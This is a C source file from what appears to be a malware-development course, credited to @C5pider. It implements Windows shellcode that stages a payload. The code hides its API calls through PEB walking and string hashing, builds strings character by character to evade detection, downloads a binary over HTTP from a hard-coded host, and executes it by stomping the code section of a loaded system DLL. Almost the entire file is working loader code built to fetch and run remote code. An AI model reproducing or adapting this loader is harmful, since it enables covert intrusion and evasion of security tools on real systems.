/*! 
 *  Author:      @C5pider 
 *  Date:        23.09.2023
 *  Description: simple shellcode that stages a reverse shell 
 *
 *  Maldev Academy 
 */

#include "shellcode.h"

/*!
 * NOTE:
 *    this code has been compiled using the 
 *    x64_86 Mingw cross compiler on linux. 
 *    So keep in mind that this might not compile 
 *    under Visual studio. 
 */

/*!
 * @brief
 *  a small stub that aligns the stack
 *  by 16-bytes as specified in the 
 *  official Microsoft documentation.
 *  this part is getting executed first when 
 *  the shellcode is getting invoked.
 */
asm(
  "Start:                         \n"
  " push rsi                      \n"
  " mov  rsi, rsp                 \n"
  " and  rsp, 0xFFFFFFFFFFFFFFF0  \n"
  " sub  rsp, 0x20                \n"
  " call Main                     \n"
  " mov  rsp, rsi                 \n"
  " pop  rsi                      \n"
  " ret                           \n"
);

/*!
* @brief
*   shellcode main function
*
*   it gets the payload from a http server and executes it via module stomping.
*/
VOID Main() {
  INSTANCE Instance     = { 0 }; 
  PVOID    Payload      = { 0 };
  SIZE_T   PayloadSize  = { 0 };
  CHAR     DllWinHttp[] = { 'w', 'i', 'n', 'h', 't', 't', 'p', NULL };
  CHAR     DllTarget[]  = { 'w', 'i', 'n', 'd', 'o', 'w', 's', '.', 's', 't', 'o', 'r', 'a', 'g', 'e', '.', 'd', 'l', 'l', 0 };

  /* connection info */ 
  WCHAR  Host[] = { L'1', L'0', L'.', L'0', L'.', L'0', L'.', L'7', L'3', NULL };
  WCHAR  Path[] = { L'/', L'p', L'a', L'y', L'l', L'o', L'a', L'd', L'.', L'b', L'i', L'n', NULL }; 
  USHORT Port   = 8000;

  RtlSecureZeroMemory( &Instance, sizeof( Instance ) );
  
  /* Load Ntdll from PEB */
  if ( ( Instance.Modules.Ntdll = LdrModulePeb( H_MODULE_NTDLL ) ) ) {

    if ( ! ( Instance.Win32.RtlAllocateHeap = LdrFunctionAddr( Instance.Modules.Ntdll, H_API_RTLALLOCATEHEAP ) ) ) {
      return; 
    }

    if ( ! ( Instance.Win32.RtlReAllocateHeap = LdrFunctionAddr( Instance.Modules.Ntdll, H_API_RTLREALLOCATEHEAP ) ) ) {
      return; 
    }

    if ( ! ( Instance.Win32.RtlFreeHeap = LdrFunctionAddr( Instance.Modules.Ntdll, H_API_RTLFREEHEAP ) ) ) {
      return; 
    }

    if ( ! ( Instance.Win32.NtProtectVirtualMemory = LdrFunctionAddr( Instance.Modules.Ntdll, H_API_NTPROTECTVIRTUALMEMORY ) ) ) {
      return; 
    }

  } else return;

  /* Load Ntdll from PEB */
  if ( ( Instance.Modules.Kernel32 = LdrModulePeb( H_MODULE_KERNEL32 ) ) ) {
    if ( ! ( Instance.Win32.LoadLibraryA = LdrFunctionAddr( Instance.Modules.Kernel32, H_API_LOADLIBRARYA ) ) ) {
      return; 
    }
  } else return;

  /* resolve winhttp functions */
  if ( ( Instance.Modules.WinHttp = Instance.Win32.LoadLibraryA( DllWinHttp ) ) ) {
    
    if ( ! ( Instance.Win32.WinHttpOpen = LdrFunctionAddr( Instance.Modules.WinHttp, H_API_WINHTTPOPEN ) ) ) {
      return; 
    }

    if ( ! ( Instance.Win32.WinHttpConnect = LdrFunctionAddr( Instance.Modules.WinHttp, H_API_WINHTTPCONNECT ) ) ) {
      return; 
    }

    if ( ! ( Instance.Win32.WinHttpOpenRequest = LdrFunctionAddr( Instance.Modules.WinHttp, H_API_WINHTTPOPENREQUEST ) ) ) {
      return; 
    }

    if ( ! ( Instance.Win32.WinHttpSendRequest = LdrFunctionAddr( Instance.Modules.WinHttp, H_API_WINHTTPSENDREQUEST ) ) ) {
      return; 
    }

    if ( ! ( Instance.Win32.WinHttpReceiveResponse = LdrFunctionAddr( Instance.Modules.WinHttp, H_API_WINHTTPRECEIVERESPONSE ) ) ) {
      return; 
    }

    if ( ! ( Instance.Win32.WinHttpReadData = LdrFunctionAddr( Instance.Modules.WinHttp, H_API_WINHTTPREADDATA ) ) ) {
      return; 
    }

    if ( ! ( Instance.Win32.WinHttpCloseHandle = LdrFunctionAddr( Instance.Modules.WinHttp, H_API_WINHTTPCLOSEHANDLE ) ) ) {
      return; 
    }

  } else return;

  /* get payload */
  if ( ! HttpGetPayload( &Instance, Host, Port, Path, &Payload, &PayloadSize ) ) {
    return; 
  }

  /* load and execute received payload */
  ModStompExecute( &Instance, DllTarget, Payload, PayloadSize );
}

BOOL HttpGetPayload(
  _In_  PINSTANCE Instance, 
  _In_  LPWSTR    Host,
  _In_  USHORT    Port, 
  _In_  LPWSTR    Path, 
  _Out_ PVOID*    Payload,
  _Out_ PSIZE_T   Size   
) {

  BOOL   Success        = FALSE;
  ULONG  Read           = 0;
  ULONG  Length         = 0; 
  HANDLE Heap           = { 0 };
  HANDLE Session        = { 0 };
  HANDLE Connect        = { 0 };
  HANDLE Request        = { 0 };
  BYTE   Buffer[ 1024 ] = { 0 };
  WCHAR  Method[]       = { L'G', L'E', L'T', NULL };

  RtlSecureZeroMemory( Buffer, sizeof( Buffer ) );

  Heap = NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap;  

  if ( ! Instance || ! Host || ! Path || ! Payload || ! Size ) {
    return FALSE;
  }

  if ( ! ( Session = Instance->Win32.WinHttpOpen( NULL, WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0 ) ) ) {
    goto LEAVE;
  }

  if ( ! ( Connect = Instance->Win32.WinHttpConnect( Session, Host, Port, 0 ) ) ) {
    goto LEAVE;
  }
  
  if ( ! ( Request = Instance->Win32.WinHttpOpenRequest( Connect, Method, Path, NULL, NULL, NULL, WINHTTP_FLAG_BYPASS_PROXY_CACHE ) ) ) {
    goto LEAVE;
  }

  if ( ! Instance->Win32.WinHttpSendRequest( Request, NULL, 0, NULL, 0, 0, 0 ) ) {
    goto LEAVE;
  }

  if ( ! Instance->Win32.WinHttpReceiveResponse( Request, NULL ) ) {
    goto LEAVE;
  } 

  *Payload = NULL;

  /* read the entire payload from the request response*/
  do {
    /* read from response */
    Success = Instance->Win32.WinHttpReadData( Request, Buffer, sizeof( Buffer ), &Read );
    if ( ! Success || Read == 0 ) {
        break;
    }

    /* allocate heap memory or more */
    if ( ! *Payload ) {
      *Payload = Instance->Win32.RtlAllocateHeap( Heap, HEAP_ZERO_MEMORY, Read );
    } else {
      *Payload = Instance->Win32.RtlReAllocateHeap( Heap, HEAP_ZERO_MEMORY, *Payload, Length + Read );
    }

    /* copy read buffer into our heap memory */
    MemCopy( C_PTR( U_PTR( *Payload ) + Length ), Buffer, Read );
    RtlSecureZeroMemory( Buffer, sizeof( Buffer ) ); 

    /* increase total read payload length */
    Length += Read;
  } while ( Success );

  *Size   = Length;
  Success = TRUE;  

LEAVE:
  if ( Session ) {
    Instance->Win32.WinHttpCloseHandle( Session );
  }

  if ( Connect ) {
    Instance->Win32.WinHttpCloseHandle( Connect );
  }

  if ( Request ) {
    Instance->Win32.WinHttpCloseHandle( Request );
  }

  return Success;
}

VOID ModStompExecute(
  _In_ PINSTANCE Instance,
  _In_ LPWSTR    Dll, 
  _In_ PVOID     Payload, 
  _In_ SIZE_T    Size
) {

  PVOID Memory  = NULL;
  ULONG Protect = 0;

  if ( ! Instance || ! Dll || ! Payload || ! Size ) {
    return; 
  } 

  __debugbreak();

  /* load module to stomp */
  if ( ! ( Memory = Instance->Win32.LoadLibraryA( Dll ) ) ) {
    goto LEAVE;
  }

  /* the NT/DOS header is around ~0x1000 big 
   * so lets skip it and get to the .text section */
  Memory += 0x1000;

  if ( ! NT_SUCCESS( Instance->Win32.NtProtectVirtualMemory( NtCurrentProcess(), &Memory, &Size, PAGE_READWRITE, &Protect ) ) ) {
    goto LEAVE;
  }

  MemCopy( Memory, Payload, Size );

  if ( ! NT_SUCCESS( Instance->Win32.NtProtectVirtualMemory( NtCurrentProcess(), &Memory, &Size, Protect, &Protect ) ) ) {
    goto LEAVE;
  }

  /* execute shellcode */
  ( ( VOID ( * ) ( VOID ) ) Memory ) ( );

LEAVE:
  return;
}


ULONG HashString(
    _In_ PVOID String,
    _In_ ULONG Length
) {
    ULONG  Hash = { 0 };
    PUCHAR Ptr  = { 0 };
    UCHAR  Char = { 0 };

    Hash = 5381;
    Ptr  = String;

    do {
        Char = *Ptr;

        if ( ! Length ) {
            if ( !*Ptr ) break;
        } else {
            if ( U_PTR( Ptr - U_PTR( String ) ) >= Length ) break;
            if ( !*Ptr ) ++Ptr;
        }

        /* turn current character to uppercase */
        if ( Char >= 'a' ) {
            Char -= 0x20;
        }

        /* append hash */
        Hash = ( ( Hash << 5 ) + Hash ) + Char;

        ++Ptr;
    } while ( TRUE );

    return Hash;
}

/*!
 * @brief
 *  load module from PEB
 * 
 * @param Hash
 *  hash of module to load
 * 
 * @return
 *  module pointer
 */ 
PVOID LdrModulePeb(
  _In_ ULONG Hash
) {
    PLDR_DATA_TABLE_ENTRY Data  = NULL;
    PLIST_ENTRY           Head  = NULL;
    PLIST_ENTRY           Entry = NULL;

    /* Get pointer to list */
    Head  = &NtCurrentTeb()->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList;
    Entry = Head->Flink;

    /* iterate over list */
    for ( ; Head != Entry ; Entry = Entry->Flink ) {
        Data = C_PTR( Entry );

        /* Compare the DLL Name! */
        if ( HashString( Data->BaseDllName.Buffer, Data->BaseDllName.Length ) == Hash ) {
            return Data->DllBase;
        }
    }

    return NULL;
}

/*!
 * @brief
 *  gets the function pointer
 *
 * @param Module
 *  module to resolve function from
 *
 * @param Hash
 *  function hash to resolve
 *
 * @return
 *  function address 
 */
PVOID LdrFunctionAddr(
    _In_ PVOID Module,
    _In_ ULONG Hash
) {
    PIMAGE_NT_HEADERS       NtHeader         = { 0 };
    PIMAGE_EXPORT_DIRECTORY ExpDirectory     = { 0 };
    SIZE_T                  ExpDirectorySize = { 0 };
    PDWORD                  AddrOfFunctions  = { 0 };
    PDWORD                  AddrOfNames      = { 0 };
    PWORD                   AddrOfOrdinals   = { 0 };
    PCHAR                   FunctionName     = { 0 };

    if ( ! Module || ! Hash ) {
      return NULL;
    }

    NtHeader         = C_PTR( Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew );
    ExpDirectory     = C_PTR( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
    ExpDirectorySize = U_PTR( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size );

    AddrOfNames      = C_PTR( Module + ExpDirectory->AddressOfNames );
    AddrOfFunctions  = C_PTR( Module + ExpDirectory->AddressOfFunctions );
    AddrOfOrdinals   = C_PTR( Module + ExpDirectory->AddressOfNameOrdinals );

    for ( int i = 0; i < ExpDirectory->NumberOfNames; i++ )
    {
      FunctionName = ( PCHAR ) Module + AddrOfNames[ i ];
      if ( HashString( FunctionName, 0 ) == Hash ) {
        return C_PTR( Module + AddrOfFunctions[ AddrOfOrdinals[ i ] ] );
      }
    }

    return NULL;
}

